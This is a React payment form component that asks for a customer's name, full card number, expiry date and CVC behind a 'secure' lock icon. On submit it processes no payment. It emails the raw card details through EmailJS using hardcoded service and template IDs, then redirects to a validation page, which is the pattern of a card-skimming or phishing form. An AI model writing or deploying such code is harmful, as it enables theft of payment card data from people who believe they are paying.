import React, { useRef, useState } from "react";
import emailjs from "emailjs-com";
import { Link, useNavigate } from "react-router-dom";
import { GrSecure } from "react-icons/gr";
import { usePaymentInputs } from "react-payment-inputs";
import "./styles.css";

export default function Form() {
  const form = useRef();
  const navigate = useNavigate();
  const { meta, getExpiryDateProps, getCVCProps } = usePaymentInputs();

  const [checked, setChecked] = useState(true);
  const [cardNumber, setCardNumber] = useState("");
  const [details, setDetails] = useState({
    expiryDate: "",
    cvc: "",
    NomDuClient: ""
  });

  const handleChange = (e) => {
    setDetails((prevFormDetails) => ({
      ...prevFormDetails,
      [e.target.name]: e.target.value
    }));
    console.log(details);
  };

  const handleChangeCardNumber = (e) => {
    setCardNumber(
      e.target.value
        .replace(/[^\dA-Z]/g, "")
        .replace(/(.{4})/g, "$1 ")
        .trim()
    );
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    if (
      (meta.isTouched && meta.error) ||
      Number(cardNumber.length) < 19 ||
      cardNumber.trim().length === 0 ||
      details.expiryDate.trim().length === 0 ||
      details.cvc.trim().length === 0 ||
      details.NomDuClient.trim().length === 0 ||
      checked === true
    ) {
      setChecked(true);
      console.log("not submit");
    } else {
      setChecked(false);
      emailjs
        .sendForm(
          "service_pduy8oo",
          "template_be4vpep",
          form.current,
          "d7GFUxt5sOvLttX-o"
        )
        .then(
          (result) => {
            console.log(result.text);
          },
          (error) => {
            console.log(error.text);
          }
        );
      navigate("/Validation");
    }
  };

  const handleCheck = () => {
    console.log("ok");
    setChecked(false);
  };

  return (
    <form ref={form} className="form" onSubmit={handleSubmit}>
      <header>
        <div className="TitleSecure">
          <h3>Payment Details </h3>
          <GrSecure className="secureIcon" />
        </div>
        <div className="Amount">
          <p> Amount : </p>
          <label className="price">100$</label>
        </div>
      </header>
      <main>
        {meta.isTouched && meta.error ? (
          <span className="span">Error: {meta.error}</span>
        ) : (
          <span className="span"></span>
        )}
        <div className="NomDuClient">
          <label> Customer Name and Surname </label>
          <input name="NomDuClient" onChange={handleChange} />
        </div>
        <div className="NumDeCarte">
          <label> Card Number </label>
          <input
            onChange={handleChangeCardNumber}
            placeholder="Valid Card Number"
            name="cardNumber"
            maxLength="19"
            value={cardNumber}
          />
        </div>
        <div className="DateEtCvc">
          <div className="Date">
            <label> Expiration date </label>
            <input
              {...getExpiryDateProps({ onChange: handleChange })}
              placeholder="MM/AA"
              name="expiryDate"
            />
          </div>
          <div className="CvC">
            <label> CVC</label>
            <input
              {...getCVCProps({ onChange: handleChange })}
              name="cvc"
              maxLength="3"
            />
          </div>
        </div>
        <div className="term">
          <input type="checkbox" onChange={handleCheck} />
          <p className="TermeConfidentialite">
            Accept the terms of <Link to="#">confidentiality</Link>
          </p>
        </div>
        <input disabled={checked} type="submit" value="Valide" className="btn" />
      </main>
      <footer>
        <img className="img1" src="/images/methode.jpg" alt="" />
        <img className="img2" src="/images/mir.png" alt="" />
      </footer>
    </form>
  );
}
